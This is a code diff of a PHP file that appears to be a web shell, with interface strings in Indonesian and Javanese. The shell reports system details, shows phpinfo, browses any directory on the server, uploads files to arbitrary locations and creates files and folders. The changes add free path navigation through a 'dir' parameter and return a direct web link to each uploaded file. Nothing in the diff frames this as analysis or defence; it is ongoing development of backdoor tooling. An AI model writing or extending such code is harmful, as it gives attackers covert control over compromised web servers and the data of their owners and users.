@@ -423,9 +423,9 @@ echo '
             <a href="?logout=true">Logout</a>
         </div>
     </center>
-
-
-
+    
+    
+    
     <?php
     $rootDir = __DIR__;
 
@@ -437,9 +437,11 @@ echo '
         phpinfo();
         exit;
     }
-    
+
     // --- Informasi sistem ---
-    $cwd = getcwd();
+    $cwd = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+    if ($cwd === false) $cwd = getcwd(); // fallback kalau path invalid
+
     $uname = php_uname();
     $user = getmyuid();
     $group = getmygid();
@@ -451,12 +453,12 @@ echo '
 
     // --- Breadcrumb ---
     $parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
-    $breadcrumb = '<a href="?dir=//' . urlencode(DIRECTORY_SEPARATOR) . '">/</a>';
+    $breadcrumb = '<a href="?dir=/">/</a>'; // Home
     $path_accum = '';
     foreach ($parts as $p) {
         if ($p === '') continue;
         $path_accum .= DIRECTORY_SEPARATOR . $p;
-        $breadcrumb .= '<a href="?dir=//' . urlencode($path_accum) . '">' . htmlspecialchars($p) . '</a>/';
+        $breadcrumb .= '<a href="?dir=' . urlencode($path_accum) . '">' . htmlspecialchars($p) . '</a>/';
     }
     ?>
 
@@ -478,6 +480,25 @@ echo '
         .status-bar a:hover {
             text-decoration:underline;
         }
+        .status-bar form {
+            display:inline;
+            margin:0;
+            padding:0;
+        }
+        .status-bar input[type="text"] {
+            width:200px;
+            font-family:monospace;
+            font-size:12px;
+            background:#111;
+            border:1px solid #444;
+            color:#eee;
+            padding:2px 4px;
+        }
+        .status-bar input[type="submit"] {
+            font-size:12px;
+            padding:2px 6px;
+            cursor:pointer;
+        }
     </style>
 
     <div class="status-bar">
@@ -487,14 +508,16 @@ echo '
         <b>Disable functions:</b> <?= htmlspecialchars($disable_functions) ?><br>
         <b>Safe mode:</b> <?= $safe_mode ?> [ <a href="?phpinfo=1">PHPinfo</a> ]<br>
         <b><?= $breadcrumb ?></b>
-        ( <a href="?dir=<?= urlencode($rootDir) ?>">Reset</a> | 
+        (
+            <a href="?dir=<?= urlencode($rootDir) ?>">Reset</a> | 
             <form method="get" style="display:inline">
-                <input type="text" name="dir" placeholder="Masukkan path..." value="<?= htmlspecialchars($cwd) ?>" 
-                    style="width:200px; font-family:monospace; font-size:12px">
+                <input type="text" name="dir" placeholder="Masukkan path..." 
+                    value="<?= htmlspecialchars($cwd) ?>">
                 <input type="submit" value="Go">
             </form>
         )
     </div>
+
 
 
 
@@ -850,18 +873,29 @@ echo '
 
 
 
-// upload handling
+// Upload File
                 if (isset($_POST['submit'])) {
-                    $uploadDir = $dir . '/'; // Set the directory where the file will be uploaded
-                    $uploadFile = $uploadDir . basename($_FILES['upload']['name']); // Get the file name
-
-                    // Check if the file was uploaded without errors
+                    $uploadDir = $dir . '/';
+                    $uploadFile = $uploadDir . basename($_FILES['upload']['name']);
+                
                     if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
-                        echo "<script>alert('File wes keupload');window.location='?dir=".$dir."';</script>";
+                        // Buat path relatif dari root web
+                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($uploadFile));
+                        $relativePath = '/' . ltrim($relativePath, '/');
+                
+                        echo "<div style='background:#222;color:#fff;padding:10px;margin:10px 0;border-radius:5px;'>
+                                File wes keupload: 
+                                <a href='{$relativePath}' style='color:#40e0d0;' target='_blank'>
+                                    {$relativePath}
+                                </a>
+                              </div>";
                     } else {
                         echo "<script>alert('File upload raiso');</script>";
                     }
                 }
+
+
+
 // Create Folder
                 if (isset($_POST['create_folder'])) {
                     $folderName = $_POST['folder_name'];
@@ -877,6 +911,9 @@ echo '
                         echo '<font color="red">Folder sudah ada.</font>';
                     }
                 }
+
+
+
 // Create File
                 if (isset($_POST['create_file'])) {
                     $fileName = $_POST['file_name'];
